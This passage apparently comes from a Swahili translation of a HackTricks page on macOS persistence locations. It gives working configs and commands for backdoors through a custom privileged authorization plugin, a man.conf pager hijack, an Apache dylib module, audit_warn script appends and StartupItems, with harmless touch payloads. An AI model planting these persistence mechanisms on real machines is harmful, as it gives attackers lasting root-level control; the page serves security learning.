<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** itawaambia mfumo wa idhini kwamba itahitaji **kuita kifaa cha nje kwa idhini**. Zaidi ya hayo, **`privileged`** itahakikisha kuwa inatekelezwa na root.

Kuzindua:
```bash
security authorize com.asdf.asdf
```
Na kisha **kikundi cha wafanyakazi kinapaswa kuwa na upatikanaji wa sudo** (soma `/etc/sudoers` kuthibitisha).

### Man.conf

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Inatumika kwa kuzidi sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini unahitaji kuwa na ruhusa ya mizizi na mtumiaji lazima atumie man
* Kuzidi TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* **`/private/etc/man.conf`**
* Inahitaji mizizi
* **`/private/etc/man.conf`**: Kila wakati man hutumiwa

#### Maelezo & Kudukua

Faili ya usanidi **`/private/etc/man.conf`** inaonyesha faili ya hati ya kufungua. Kwa hivyo njia ya kutekelezeka inaweza kubadilishwa ili wakati wowote mtumiaji anatumia man kusoma baadhi ya hati, mlango wa nyuma unatekelezwa.

Kwa mfano weka katika **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Na kisha tengeneza `/tmp/view` kama:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Maelezo**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Inatumika kukiuka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini unahitaji kuwa na ruhusa ya msingi na apache inahitaji kuwa inaendeshwa
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)
* Httpd haina ruhusa

#### Mahali

* **`/etc/apache2/httpd.conf`**
* Inahitaji ruhusa ya msingi
* Kichocheo: Wakati Apache2 inaanza

#### Maelezo & Kudukua

Unaweza kuonyesha katika `/etc/apache2/httpd.conf` ili kupakia moduli kwa kuongeza mstari kama huu:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Hivi ndivyo moduli zako zilivyopakiwa na Apache. Kitu pekee ni kwamba unahitaji **kuisaini na cheti halali cha Apple**, au unahitaji **kuongeza cheti kipya cha kuaminika** kwenye mfumo na **kuisaini** nacho.

Kisha, ikihitajika, ili kuhakikisha kuwa server itaanza unaweza kutekeleza:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Mfano wa nambari kwa Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Kitengo cha ukaguzi wa mfumo wa BSM

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Inatumika kukiuka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini unahitaji kuwa na ruhusa ya msingi, auditd iwe inaendeshwa na kusababisha onyo
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* **`/etc/security/audit_warn`**
* Inahitaji ruhusa ya msingi
* **Kichocheo**: Wakati auditd inagundua onyo

#### Maelezo & Utekaji

Kila wakati auditd inagundua onyo, hati **`/etc/security/audit_warn`** ina **kutekelezwa**. Kwa hivyo unaweza kuongeza mzigo wako kwenye hiyo.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Unaweza kulazimisha onyo na `sudo audit -n`.

### Vipengele vya Kuanza

{% hint style="danger" %}
**Hii imepitwa na wakati, kwa hivyo hakuna kitu kinapaswa kupatikana katika saraka hizo.**
{% endhint %}

**StartupItem** ni saraka ambayo inapaswa kuwekwa ndani ya `/Library/StartupItems/` au `/System/Library/StartupItems/`. Mara tu saraka hii inapoanzishwa, lazima ijumuishe faili mbili maalum:

1. **rc script**: Skripti ya shell inayotekelezwa wakati wa kuanza.
2. Faili ya **plist**, iitwayo `StartupParameters.plist`, ambayo ina mipangilio mbalimbali ya usanidi.

Hakikisha kwamba skripti ya rc na faili ya `StartupParameters.plist` zimewekwa kwa usahihi ndani ya saraka ya **StartupItem** ili mchakato wa kuanza uweze kuzitambua na kuzitumia.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="jina la huduma kuu" %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
Sijaweza kupata sehemu hii kwenye macOS yangu kwa habari zaidi angalia andiko
{% endhint %}

Andiko: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Kuletwa na Apple, **emond** ni mfumo wa kuingiza taarifa ambao unaonekana kutokuwa umekamilika au labda umeachwa, lakini bado unapatikana. Ingawa sio muhimu sana kwa msimamizi wa Mac, huduma hii isiyoeleweka inaweza kutumika kama njia ya kudumu kwa wahalifu wa mtandao, labda bila kugunduliwa na wengi wa wasimamizi wa macOS.

Kwa wale wanaofahamu uwepo wake, kutambua matumizi mabaya yoyote ya **emond** ni rahisi. LaunchDaemon ya mfumo kwa huduma hii inatafuta hati za kutekelezwa kwenye saraka moja. Ili kuangalia hili, amri ifuatayo inaweza kutumika:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Mahali

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Inahitaji mizizi
* **Kichocheo**: Pamoja na XQuartz

#### Maelezo & Kudukuliwa

XQuartz **haipo tena imewekwa kwenye macOS**, kwa hivyo ikiwa unataka habari zaidi angalia maelezo.

### ~~kext~~

{% hint style="danger" %}
Ni ngumu sana kusakinisha kext hata kama mizizi hivyo sitazingatia hii kutoroka kutoka kwa mchanga au hata kwa uthabiti (isipokuwa una shambulio)
{% endhint %}

#### Mahali

Ili kusakinisha KEXT kama kipengee cha kuanza, inahitaji **kusakinishwa kwenye mojawapo ya maeneo yafuatayo**:

* `/System/Library/Extensions`
* Faili za KEXT zilizojengwa kwenye mfumo wa uendeshaji wa OS X.
* `/Library/Extensions`
* Faili za KEXT zilizosakinishwa na programu ya tatu

Unaweza kupata orodha ya faili za kext zilizosakinishwa kwa sasa na:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Kwa maelezo zaidi kuhusu [**vifaa vya msingi vya kernel angalia sehemu hii**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Mahali

* **`/usr/local/bin/amstoold`**
* Inahitaji ruhusa ya Root

#### Maelezo & Utekaji

Inaonekana kwamba `plist` kutoka `/System/Library/LaunchAgents/com.apple.amstoold.plist` ilikuwa inatumia binary hii wakati inafunua huduma ya XPC... swala ni kwamba binary haikuwepo, hivyo ungeweza kuweka kitu hapo na wakati huduma ya XPC inaitwa binary yako itaitwa.

Sikuweza tena kupata hii kwenye macOS yangu.

### ~~xsanctl~~

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Mahali

* **`/Library/Preferences/Xsan/.xsanrc`**
* Inahitaji ruhusa ya Root
* **Kichocheo**: Wakati huduma inapoendeshwa (kwa nadra)

#### Maelezo & utekaji

Inaonekana sio kawaida sana kuendesha script hii na hata sikuiweza kwenye macOS yangu, hivyo kama unataka maelezo zaidi angalia maelezo.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Hii haifanyi kazi katika toleo za kisasa za MacOS**
{% endhint %}

Pia niwezekano kuweka hapa **maagizo ambayo yataendeshwa wakati wa kuanza.** Mfano wa script ya kawaida ya rc.common:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Mbinu na zana za uthabiti

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
